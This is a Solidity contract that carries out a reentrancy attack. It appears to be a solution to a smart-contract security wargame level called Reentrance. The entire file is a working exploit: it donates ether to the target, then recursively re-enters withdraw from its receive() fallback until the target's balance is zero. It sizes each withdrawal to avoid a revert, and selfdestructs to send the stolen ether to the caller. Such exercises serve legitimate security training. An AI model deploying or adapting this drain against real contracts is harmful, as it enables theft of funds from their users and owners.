// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {IReentrance} from "src/hack/interfaces/IReentrance.sol";

contract ReentranceHack {
    IReentrance private immutable reentrance;

    constructor(address _reentrance) {
        // Load Reentrance contract instance using interface
        reentrance = IReentrance(_reentrance);
    }

    // Send 0.001 ether and withdraw immediately
    // This will trigger the receive function when withdraw is called on Reentrance contract
    function hack() public payable {
        // Donations will be made against the address of the ReentranceHack contract.
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);

        require(address(reentrance).balance == 0, "FAILED!!!");

        // Recover sent ether
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 balance = reentrance.balanceOf(address(this));

        // Check if the contract balance is smaller than the donation.
        // Withdraw the lesser of the two amounts, so that the transaction does not revert
        uint256 withdrawableAmount = balance < 0.001 ether
            ? balance
            : 0.001 ether;

        // Stop withdrawing if the contract balance is 0, so that the transaction does not revert
        if (withdrawableAmount > 0) {
            reentrance.withdraw(withdrawableAmount);
        }
    }
}
